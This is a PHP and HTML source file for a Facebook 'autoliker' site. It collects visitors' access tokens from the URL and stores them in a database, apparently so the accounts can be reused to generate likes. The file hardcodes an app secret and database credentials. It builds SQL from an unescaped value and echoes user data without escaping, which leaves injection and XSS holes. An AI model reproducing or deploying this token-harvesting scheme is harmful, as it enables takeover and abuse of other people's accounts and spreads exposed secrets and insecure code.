<?php
require 'facebook.php';

$token = $_GET["accesstoken"];
$fb_secret  = $_GET["sec"];
$fb_app_url  = 'http://likepro.net';

$host = "localhost";
$username = "anang_wap";
$password = "123456";
$dbname = "anang_wap";

$facebook = new Facebook(array(
'appId' => '190499737732728',
'secret' => '1ad06c71c3e1f2eb09a399099270c011',
'cookie' => true
));

//database connect
mysql_connect($host,$username,$password) or die(mysql_error());
mysql_select_db($dbname) or die(mysql_error());
mysql_query("SET NAMES utf8");

mysql_query("CREATE TABLE IF NOT EXISTS `phil` (
`id` int(11) NOT NULL AUTO_INCREMENT,
`user_id` varchar(32) NOT NULL,
`name` varchar(32) NOT NULL,
`access_token` varchar(255) NOT NULL,
PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
");

try {
$parameters['access_token'] = $_GET["accesstoken" ];
$userData = $facebook->api('/me', $parameters);
} catch (FacebookApiException $e) {
die("invalid access token");
}

if($userData){


//check that user is not already inserted? If is. check it's access token and update if needed
//also make sure that there is only one access_token for each user
$row = null;
$result = mysql_query("
SELECT
*
FROM
phil
WHERE
user_id = '" . mysql_real_escape_string($userData['id']) . "'
");

if($result){
$row = mysql_fetch_array($result, MYSQL_ASSOC);
if(mysql_num_rows($result) > 1){
mysql_query("
DELETE FROM
phil
WHERE
user_id='" . mysql_real_escape_string($userData['id']) . "' AND
id != '" . $row['id'] . "'
");
}
}

if(!$row){
mysql_query(
"INSERT INTO
phil
SET
`user_id` = '" . mysql_real_escape_string($userData['id']) . "',
`name` = '" . mysql_real_escape_string($userData['name']) . "',
`access_token` = '" . mysql_real_escape_string($token) . "'
");
} else {
mysql_query(
"UPDATE
phil
SET
`access_token` = '" . mysql_real_escape_string($token) . "'
WHERE
`id` = " . $row['id'] . "
");
}
}



try {
$parameters['access_token'] = $_GET["accesstoken"];
$statuses = $facebook->api('/me/feed?limit=1=', $parameters);
foreach($statuses['data'] as $status)
{
echo $status["me/photo"], "<br />";
}
}
catch (FacebookApiException $e) {
die("invalid access token");
}


//getting uid
$get = "https://graph.facebook.com/me?access_token=".$token;
$getj = file_get_contents($get);
$data = json_decode($getj, true);
$uids = $data[id];

//checking vip
$svip = mysql_query("SELECT * FROM vip WHERE uid='".$uids."'");

//BAN
if($userData['id']=="100002910642271"
|| $userData['id']=="100003696693667"
|| $userData['id']=="100002910642271"
|| $userData['id']=="100002910642271"
|| $userData['id']=="100000568742663"
|| $userData['id']=="100001919176370"
|| $userData['id']=="100001523700080"
|| $userData['id']=="100001089852854"
){
echo "You are ban";
exit;
}






?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Asia Liker</title>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.0/jquery.min.js"></script>
<link rel="shortcut icon" href="http://www.abflags.com/_flags/flags-of-the-world/Malaysia%20flag/Malaysia%20flag-XS-anim.gif" />
<body>
<link rel="stylesheet" type="text/css" href="http://apmliker.antserve.net/theme/default/style.css" media="all,handheld"/>
</body>
</head>
<div class="footer"><center><h3>Zone LIKER</h3></center></div>
<div class="rmenu"><center>Tunggu Loading sampai Selesai, Baru Klik Autolike</center></div></br>
<div class="menu">
<center><img src="https://graph.facebook.com/me/picture?type=normal&access_token=<?php echo $token;?>" width='110px' height '150px'></center></div>
<br/>
<div class="footer"><center>Selamat Datang Majikan Ndoro Agung  Drs, Prof.  <?php echo $userData['name']; ?>:<br/><br/>
Status: </br><div><?php echo $status["message"];?></center></div>
</br>
</br>
<div class="rmenu"><center>
<button id="button" class="submit">Autolike</button>
<img id="loading" style="display: none;" src="https://s-static.ak.facebook.com/rsrc.php/v1/yb/r/GsNJNwuI-UM.gif" />
<div id="done" style="display: none;"><font size="4">Success!</font></div></center></div><br/><br/>
<script type="text/javascript" >
$(function() {
$(".submit").click(function() {
$("#button").hide();
$("#loading").show();
var postid = "<?php echo $status["id"];?>" ;
$.ajax({
type: "POST",
url: "likes.php",
data: {
postid: postid
},
success: function(){
$("#loading").hide();
$("#done").show();
}
});


});
});
</script>


</center>
</body>
</html>
